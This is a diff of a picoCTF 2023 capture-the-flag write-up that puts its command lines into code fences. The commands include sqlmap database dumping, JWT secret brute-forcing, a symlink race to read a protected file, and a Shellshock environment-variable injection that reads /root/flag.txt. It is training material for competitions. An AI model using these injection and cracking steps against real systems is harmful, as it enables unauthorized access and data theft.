@@ -272,7 +272,7 @@ FLAG:- ```picoCTF{us3l3ss_ch4ll3ng3_3xpl0it3d_3555}```
 
 We were given a ssh instance to connect to. lets go ahead and connect
 
->command: ssh ctf-player@saturn.picoctf.net -p 58250
+command:```ssh ctf-player@saturn.picoctf.net -p 58250```
 
 ![image](https://user-images.githubusercontent.com/67879936/226752947-6607c591-4802-47de-bc11-59af3658dbea.png)
 
@@ -525,7 +525,7 @@ search=Lagos&submit=Search
 ```
 We'll be using sqlmap to dump databases here. First lets check the table names available
 
->command: sqlmap -r req.txt --dbs --tables
+command:```sqlmap -r req.txt --dbs --tables```
 
 ```
 ┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/picoCTF_2023/web]
@@ -576,7 +576,7 @@ back-end DBMS: SQLite
 ```
 We'll be using the table name ```more_table```. Now that we have found the name of our table lets go ahead and dump everything available in this table
 
->command: sqlmap -r req.txt --dbs -T more_tables --columns --dump-all
+command:```sqlmap -r req.txt --dbs -T more_tables --columns --dump-all```
 
 ```
 ┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/picoCTF_2023/web]
@@ -730,7 +730,7 @@ So what I did was to crack it, I used a tool called ```jwt-cracker```
 
 You can download it [here](https://github.com/lmammino/jwt-cracker)
 
->command: jwt-cracker eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTY4MDExMzQ1MSwiaWF0IjoxNjc5NTA4NjUxLCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.2RQlnqDTS1xJwChm7aR-uNk7Q8naxsoHw0tGq1AzyRw 123456789 6
+command:```jwt-cracker eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTY4MDExMzQ1MSwiaWF0IjoxNjc5NTA4NjUxLCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.2RQlnqDTS1xJwChm7aR-uNk7Q8naxsoHw0tGq1AzyRw 123456789 6```
 
 ```
 ┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/picoCTF_2023/web]
@@ -831,7 +831,7 @@ extradata:0         .. file: Zip archive data, at least v1.0 to extract, compres
 ```
 As you can see this png image has the header of a zip file. Interesting 😎. So, I went ahead to unzip
 
->command: unzip flag.png
+command:```unzip flag.png```
 
 ```             
 ┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/picoCTF_2023/forensics]
@@ -881,7 +881,7 @@ trace.pcap: pcap capture file, microsecond ts (little-endian) - version 2.4 (Raw
 ```
 So, this is a pcap file. I didn't want to go through the stress of using wireshark so I grepped the flag out
 
->command: strings trace.pcap| grep -i "pico"
+command:```strings trace.pcap| grep -i "pico"```
 
 ![image](https://user-images.githubusercontent.com/67879936/227007868-3bda3353-4c32-45fe-8136-f78e1da6af10.png)
 
@@ -917,7 +917,7 @@ Going through the mail, I found an IP address
 
 From the hint provided "**_whois can be helpful on IP addresses also, not only domain names._**". This means we can run the ```whois``` command on this ip address
 
->command: whois 173.249.33.206
+command:```whois 173.249.33.206```
 
 ```
 ┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/picoCTF_2023/forensics]
@@ -1191,7 +1191,7 @@ After researching for a while, I got to know about a tool called ```stegoveritas
 
 To install this tool: ```pip3 install stegoveritas```
 
->command: stegoveritas -extractLSB -steghide -bruteLSB Ninja-and-Prince-Genji-Ukiyoe-Utagawa-Kunisada.flag.png
+command:```stegoveritas -extractLSB -steghide -bruteLSB Ninja-and-Prince-Genji-Ukiyoe-Utagawa-Kunisada.flag.png```
 
 ```
 ┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/picoCTF_2023/forensics]
@@ -1326,13 +1326,13 @@ This script is extracting every second byte from the BMP image file and writing 
 
 Now, lets save this script in a ```.py``` file and run it in the same directory where we have our ```output.bmp``` file. 
 
->command: python omor.py
+command:```python omor.py```
 
 ![image](https://user-images.githubusercontent.com/67879936/227178658-e35272ea-c451-4db0-94df-e19ca41eeab0.png)
 
 As you can see we now have a zip file. Lets use binwalk to extract information from this
 
->command: binwalk -e output.txt
+command:```binwalk -e output.txt```
 
 ![image](https://user-images.githubusercontent.com/67879936/227179574-5daf4aa2-7e7f-4d47-8ffd-957cf3caf70f.png)
 
@@ -1361,7 +1361,7 @@ disk.flag.img.gz: gzip compressed data, was "disk.flag.img", last modified: Thu 
 ```
 This is a compressed data, to extract we'll be using the ```gzip``` command
 
->command: gzip -d disk.flag.img.gz
+command:```gzip -d disk.flag.img.gz```
 
 ```
 ┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/picoCTF_2023/forensics]
@@ -1378,13 +1378,13 @@ disk.flag.img: DOS/MBR boot sector; partition 1 : ID=0x83, active, start-CHS (0x
 ```
 cool, now we got a disk image. Lets go ahead and mount it. 
 
->command: fdisk -l disk.flag.img
+command:```fdisk -l disk.flag.img```
 
 ![image](https://user-images.githubusercontent.com/67879936/227453796-987d0ddf-989f-4853-bb87-6ad3073c0f11.png)
 
 Multiply that number by 512, multiplying mine I get ```374341632```. So, now we'll be using this command
 
->command: sudo mount -t ext4 -o loop,offset=374341632 disk.flag.img /mnt/
+command:```sudo mount -t ext4 -o loop,offset=374341632 disk.flag.img /mnt/```
 
 ![image](https://user-images.githubusercontent.com/67879936/227454325-d6a3364a-33d8-4976-abbc-7f7485efe92f.png)
 
@@ -1518,7 +1518,7 @@ les-mis.txt.enc: data
 ```
 This means we can use openssl to decrypt the texts since we found the key in their conversation earlier.
 
->command:  openssl enc -aes-256-cbc -d -in dracula.txt.enc -out dracula_decrypted -salt -iv 7a12fd4dc1898efcd997a1b9496e7591  -K 58593a7522257f2a95cce9a68886ff78546784ad7db4473dbd91aecd9eefd508
+command:```openssl enc -aes-256-cbc -d -in dracula.txt.enc -out dracula_decrypted -salt -iv 7a12fd4dc1898efcd997a1b9496e7591  -K 58593a7522257f2a95cce9a68886ff78546784ad7db4473dbd91aecd9eefd508```
 
 ```
 ┌──(bl4ck4non㉿bl4ck4non)-[/mnt/home/yone/gallery]
@@ -1558,7 +1558,7 @@ frankenstein_decrypted: Unicode text, UTF-8 (with BOM) text, with CRLF line term
 └─$ file lesmis_decrypted 
 lesmis_decrypted: Unicode text, UTF-8 (with BOM) text, with CRLF line terminators
 ```
-cool, we have them decoded already. But trust me when I say there's nothing there, just a thousand line of stories and all 😂. 
+cool, we have them decoded already. But trust me when I say there's nothing there, just stories that are thoudands of lines and all 😂. 
 
 The next goal now is to look for the passphrase we can use to extract information from ```7.bmp```. 
 
@@ -1827,13 +1827,13 @@ print(len(out))
 ```
 Save this script and run it.
 
->command: python bankai.py
+command:```python bankai.py```
 
 ![image](https://user-images.githubusercontent.com/67879936/227496312-eba1532c-92da-46fa-804d-c90b63a31b37.png)
 
 we got the key😆. With this we can decrypt the encrypted text
 
->command: openssl enc -aes-256-cbc -d -in ledger.1.txt.enc -out bankai_zankanotachi -salt -iv 908458e48fc8db1c5a46f18f0feb119f  -K a9f86b874bd927057a05408d274ee3a88a83ad972217b81fdc2bb8e8ca8736da
+command:```openssl enc -aes-256-cbc -d -in ledger.1.txt.enc -out bankai_zankanotachi -salt -iv 908458e48fc8db1c5a46f18f0feb119f  -K a9f86b874bd927057a05408d274ee3a88a83ad972217b81fdc2bb8e8ca8736da```
 
 ![image](https://user-images.githubusercontent.com/67879936/227497310-91e27f7f-384f-4fdf-96f7-c37eab179ef9.png)
 
@@ -2025,7 +2025,7 @@ You can read more about python library hijacking [here](https://medium.com/analy
 
 Lets locate the ```base64.py``` file
 
->command: find / 2>/dev/null | grep -i "base64.py"
+command:```find / 2>/dev/null | grep -i "base64.py"```
 
 ![image](https://user-images.githubusercontent.com/67879936/227750247-e8d8fc70-6115-4ff7-96ac-901d2c6107b2.png)
 
@@ -2084,13 +2084,13 @@ Now, lets exploit this. If we are successful with exploiting it we should be abl
 
 We'll start by creating a directory in the ```/tmp``` directory
 
->command: mkdir /tmp/hax
+command:```mkdir /tmp/hax```
 
 ![image](https://user-images.githubusercontent.com/67879936/227751729-15328dfa-b5d0-496f-8f49-fb1064121c5b.png)
 
 then we'll create a symbolic link
 
->command: ln -s /home/ctf-player/flag.txt /tmp/hax/flag.txt
+command:```ln -s /home/ctf-player/flag.txt /tmp/hax/flag.txt```
 
 ![image](https://user-images.githubusercontent.com/67879936/227751749-864e8da8-34bc-422f-8921-b30fed8b6ba7.png)
 
@@ -2115,25 +2115,25 @@ int main(int argc, char *argv[]) {
 ```
 save this in a ```.c``` file and compile it
 
->command: gcc -o abeg abeg.c
+command:```gcc -o abeg abeg.c```
 
 ![image](https://user-images.githubusercontent.com/67879936/227751808-a71085fd-694a-4b4e-8098-0898d9db98a3.png)
 
 cool, lets create an empty file in the ```/tmp``` directory
 
->command: touch /tmp/hax/asd
+command:```touch /tmp/hax/asd```
 
 ![image](https://user-images.githubusercontent.com/67879936/227751879-b816917f-fd68-4912-9939-b43e8da04fcf.png)
 
 Lets run the binary ```abeg```
 
->./abeg /tmp/hax/flag.txt /tmp/hax/asd
+command:```./abeg /tmp/hax/flag.txt /tmp/hax/asd```
 
 ![image](https://user-images.githubusercontent.com/67879936/227751895-ebe99dc0-8ddf-4676-94cd-09b819ebffeb.png)
 
 Open up another terminal and try to read the ```flag.txt``` file 
 
->command: ./txtreader /tmp/hax/flag.txt
+command:```./txtreader /tmp/hax/flag.txt```
 
 ![image](https://user-images.githubusercontent.com/67879936/227752206-44467551-e444-4bf5-8e66-f49774b277be.png)
 
@@ -2158,7 +2158,7 @@ cool, from the challenge description we have a binary that can list directories 
 
 We get an error message when we try to run the binary, this means we have to set the environment variable ```SECRET_DIR```.
 
->command: export SECRET_DIR=/root
+command:```export SECRET_DIR=/root```
 
 Then we run the binary
 
@@ -2170,7 +2170,7 @@ After doing my research I found this ```export SECRET_DIR='() { :;};  cat /root/
 
 <font color="Green">This command  defines an environment variable named SECRET_DIR with a value that contains a Bash function. The function contains a Bash vulnerability known as Shellshock that allows an attacker to execute arbitrary commands on the system by appending commands to environment variables. Executing this command could potentially allow an attacker to gain unauthorized access to sensitive information on the system.</font>
 
->command: export SECRET_DIR='() { :;};  cat /root/flag.txt'
+command:```export SECRET_DIR='() { :;};  cat /root/flag.txt'```
 
 Running the ```bin``` binary now should give you your flag
 
@@ -2221,7 +2221,7 @@ CPU Type                        : AMD x86-64
 ```
 cool, it is an executable, using the ```strings``` command actually gave me the flag
 
->command: strings ret | grep -i "pico"
+command:```strings ret | grep -i "pico"```
 
 ![image](https://user-images.githubusercontent.com/67879936/228825680-46db6658-59d5-4382-b4d6-f83c740d455a.png)
 
@@ -2263,7 +2263,7 @@ MIME Type                       : application/java-byte-code
 ```
 The same way we got the flag for the previous challenge is the same way we are getting the flag for this challenge. That is, we'll be using the ```strings``` command.
 
->command: strings SafeOpener.class| grep -i "pico"
+command:```strings SafeOpener.class| grep -i "pico"```
 
 ![image](https://user-images.githubusercontent.com/67879936/228826698-650e28a6-8468-46a5-b723-9eb3d75ee412.png)
 
@@ -2374,7 +2374,7 @@ end
 ```
 Run the imp file against the server using the nc listener provided by PicoCTF
 
->command: nc saturn.picoctf.net 64120 < imp.red
+command:```nc saturn.picoctf.net 64120 < imp.red```
 
 ```
 ┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/picoCTF_2023/rev_eng]
@@ -2448,8 +2448,8 @@ FLAG:- ```picoCTF{d3m0n_3xpung3r_ed173f56}```
 
 
 
-## Remaining Solutions
-My Team mate [cyber_guru](https://github.com/Cyberguru1) solved the other categories of the challegnes
+## Remaining Solutions (poweranalysis 1, poweranalysis 2, poweranalysis warmup, sra, readygladiator 1, readygladiator 0, no way out, timer)
+My Team mate [cyber_guru](https://github.com/Cyberguru1) solved them
 take a look [here](https://github.com/Cyberguru1/PicoCTF2023_Writeup/blob/master/README.md)
 
 <br> <br>
